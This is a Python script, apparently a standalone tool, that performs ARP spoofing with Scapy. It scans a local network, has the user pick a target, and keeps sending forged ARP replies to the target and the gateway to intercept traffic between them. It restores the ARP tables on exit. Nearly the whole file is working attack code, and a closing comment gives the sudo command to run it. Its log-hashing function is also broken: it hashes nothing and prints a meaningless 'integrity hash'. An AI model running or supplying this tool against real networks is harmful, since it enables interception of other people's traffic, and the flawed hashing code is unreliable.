from scapy.all import ARP, Ether, srp, send
import time
import argparse
import logging
import hashlib
from datetime import datetime

def hash_file(filename):
    with open(filename, "rb") as f:
        while True:  # Compatible with older Python versions
            chunk = f.read(4096)
            if not chunk:
                break
            hashlib.sha256().update(chunk)
    return hashlib.sha256().hexdigest()

# Configure logging
logging.basicConfig(filename="arpspoof.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Function to get MAC address from IP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    if result:
        return result[0][1].hwsrc  # Return MAC address from first response
    else:
        return None
    
# Function to scan the local network
def scan_network(network):
    arp_request = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    devices = []
    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})
    return devices

# Function to perform ARP spoofing
def arp_spoof(target_ip, target_mac, gateway_ip):
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet1, verbose=False)
    print(f"Sent ARP spoof packet to {target_ip} ({target_mac}) claiming to be {gateway_ip}")
    logging.info(f"Sent ARP spoof packet to {target_ip} ({target_mac}) claiming to be {gateway_ip}, {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# Function to restore ARP tables
def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    send(packet1, verbose=False)
    send(packet2, verbose=False)
    print(f"Restored ARP tables for {target_ip} and {gateway_ip}")
    logging.info(f"Restored ARP tables for {target_ip} and {gateway_ip}, {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# Main function
def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing script")
    parser.add_argument("-n", "--network", required=True, help="Network range to scan (e.g., 192.168.0.0/24)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (e.g., router IP: 192.168.0.1)")
    args = parser.parse_args()

    # Step 1: Scan the network
    print("[*] Scanning the network...")
    devices = scan_network(args.network)

    if not devices:
        print("[!] No devices found.")
        return

    print("\n[*] Devices found:")
    for i, device in enumerate(devices):
        print(f"[{i}] IP: {device['ip']}, MAC: {device['mac']}")

    # Step 2: Select a target
    target_index = int(input("\n[*] Select target index: "))
    target = devices[target_index]

    print(f"[*] Target selected: {target['ip']} ({target['mac']})")
    logging.info(f"[*] Target selected: {target['ip']} ({target['mac']}), {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # Get the gateway MAC address
    gateway_mac = [dev["mac"] for dev in devices if dev["ip"] == args.gateway]
    if not gateway_mac:
        print("[!] Could not find gateway MAC address.")
        return
    gateway_mac = gateway_mac[0]

    print(f"[*] Gateway MAC address: {gateway_mac}")

    try:
        print(f"[*] Starting ARP spoofing... Press Ctrl+C to stop.")
        logging.info(f"[*] Starting ARP spoofing... Press Ctrl+C to stop. {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        while True:
            arp_spoof(target["ip"], target["mac"], args.gateway)
            arp_spoof(args.gateway, gateway_mac, target["ip"])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoofing...")
        restore_arp(target["ip"], target["mac"], args.gateway, gateway_mac)
        print("[*] ARP tables restored. Exiting.")
        # Hash log file
        log_hash = hash_file("arpspoof.log")
        print(f"[*] Log file integrity hash (SHA-256): {log_hash}")
        logging.info(f"[*] Log file integrity hash (SHA-256): {log_hash}. {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    main()

# sudo python index.py -n 192.168.0.0/24 -g 192.168.0.1 2>/dev/null